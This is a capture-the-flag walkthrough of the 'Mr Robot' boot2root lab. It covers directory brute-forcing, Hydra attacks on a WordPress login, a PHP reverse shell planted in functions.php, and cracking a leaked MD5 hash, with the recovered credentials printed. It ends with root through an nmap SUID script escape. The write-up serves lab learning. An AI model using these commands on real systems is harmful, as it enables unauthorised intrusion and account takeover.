# Mr Robot CTF

## Challenge Information

* **Challenge Name**: Mr Robot CTF
* **Category**: Boot2Root
* **Difficulty Level**: Medium

## Investigation Steps

1. **Perform Nmap Scan**: First of all, I ran nmap on the ip where i found just 3 ports open: `80, 443, 22`. Simply running the ip in the browser, it opens a terminal like starting a linux machine. Entering help command in the terminal opened, there were some recommended commands. I ran them all one by one but did not find anything.

2. **Brute Force Directories**: Than I decided to brute force the directories:

   ```text
   ffuf -u http://10.201.79.92/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -c -mc 200,301,302,403
   ```

   This gave me many accessible directories. Some of them were not even opening, some of them gave some taunting sentences, some of them were very relavant:

   ```text
   blog                    [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 273ms]
   images                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 273ms]
   rss                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 337ms]
   sitemap                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 236ms]
   login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 695ms]
   video                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 249ms]
   0                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 351ms]
   feed                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 360ms]
   image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 441ms]
   atom                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 411ms]
   wp-content              [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 242ms]
   admin                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 239ms]
   audio                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 240ms]
   intro                   [Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 240ms]
   wp-login                [Status: 200, Size: 2664, Words: 115, Lines: 53, Duration: 388ms]
   css                     [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 247ms]
   rss2                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 447ms]
   license                 [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 247ms]
   wp-includes             [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 245ms]
   js                      [Status: 301, Size: 231, Words: 14, Lines: 1, Duration: 248ms]
   Image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 394ms]
   rdf                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 360ms]
   page1                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 380ms]
   readme                  [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 245ms]
   robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 237ms]
   dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 380ms]
   %20                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 406ms]
   wp-admin                [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 243ms]
   0000                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 349ms]
   phpmyadmin              [Status: 403, Size: 94, Words: 14, Lines: 1, Duration: 256ms]
   wp-signup               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1505ms]
   IMAGE                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1596ms]
                           [Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 237ms]
   :: Progress: [87664/87664] :: Job [1/1] :: 23 req/sec :: Duration: [0:54:27] :: Errors: 0 ::
   ```

3. **Check the Robots Directory**: The robots directory contained a file named **key-1-of-3.txt** which was our first flag. There was another file named **fsocity.dic** which likely contained a long wordlist which is most likely a type of dictionary. Lets try it to find any type of credential for the wordpress login.

   For that, I tried some random user and passsord first. The login page gave an error of **incorrect username** which means that we can find valid username through bruteforcing. To capture the sample request, I used burpsuite.

   Then I generated a hydra command to find out the username:

   ```text
   hydra -L fsociety.uniq.dic -p test 10.201.79.92 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 40
   ```

   This gave the valid username: **elliot**.

   Now lets find out the password:

   ```text
   hydra -l elliot -P fsociety.uniq.dic 10.201.79.92 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=The password you entered for the username" -t 40 -f
   ```

   Now we have correct credentials, so now lets login to the account:

   ```text
   username: elliot
   password: ER28-0652
   ```

4. **Get a Reverse Shell**: To get a reverse shell, lets upload php reverse shell code in the **functions.php** file in **Appearance** -> **Editor**. Set up a listener in a terminal and update the file in the wordpress site. Reloading the file will give a reverse shell in the terminal (this might take a few seconds). The reverse shell php code can be found in the github repo of **PentestMonkey**.

5. **Enumerate the Linux System**: After getting the shell, we can use linux commands for simple enumeration. By listing the **home** directory, we can see 2 users: **robot** and **ubuntu**.

   In the **robot** directory, there are 2 files. One is the flag file which says permission denied when tried to read. One is the password file in which a md5 hash is present:

   ```text
   robot:c3fcd3d76192e4007dfb496cca67e13b
   ```

   Cracking that hash on **crackstation** gave the original password. Switch the user using the new password:

   ```text
   su robot
   abcdefghijklmnopqrstuvwxyz
   ```

   Now we can read the second flag.

   Additionally, we can make our reverse shell a bit stable using the following python module:

   ```text
   python -c 'import pty; 
   pty.spawn("/bin/bash")'
   ```

6. **Escalate Privileges**: Now our next task is to escalate our privileges. The most common method is to check SUID set local binaries:

   ```text
   find / -type f -perm -04000 -ls 2>/dev/null
   ```

   This gave some following files:

   ```text
        1157     40 -rwsr-xr-x   1 root     root        39144 Apr  9  2024 /bin/umount
        1130     56 -rwsr-xr-x   1 root     root        55528 Apr  9  2024 /bin/mount
        2587     68 -rwsr-xr-x   1 root     root        67816 Apr  9  2024 /bin/su
        9124     68 -rwsr-xr-x   1 root     root        68208 Feb  6  2024 /usr/bin/passwd
        8963     44 -rwsr-xr-x   1 root     root        44784 Feb  6  2024 /usr/bin/newgrp
        9117     52 -rwsr-xr-x   1 root     root        53040 Feb  6  2024 /usr/bin/chsh
        5092     84 -rwsr-xr-x   1 root     root        85064 Feb  6  2024 /usr/bin/chfn
        9123     88 -rwsr-xr-x   1 root     root        88464 Feb  6  2024 /usr/bin/gpasswd
        4484    164 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /usr/bin/sudo
         763     32 -rwsr-xr-x   1 root     root        31032 Feb 21  2022 /usr/bin/pkexec
        4430     20 -rwsr-xr-x   1 root     root        17272 Jun  2 18:23 /usr/local/bin/nmap
       20504    468 -rwsr-xr-x   1 root     root       477672 Apr 11 12:16 /usr/lib/openssh/ssh-keysign
        6761     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
      150122     24 -rwsr-xr-x   1 root     root        22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
       395259     12 -r-sr-xr-x   1 root     root         9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
       395286     16 -r-sr-xr-x   1 root     root        14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
       783960     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   ```

   The most suspecious one is the **/usr/local/bin/nmap** as it is present as a local binary. Search for exploitation on **GTFO Bins**. To get the shell, run the following commands:

   ```text
   TF=$(mktemp)
   echo 'os.execute("/bin/sh")' > $TF
   nmap --script=$TF
   ```

   Now we can verify our presence as root using `whoami`. Now lets read the 3rd flag file: `cat /root/key-3-of-3.txt`.

---
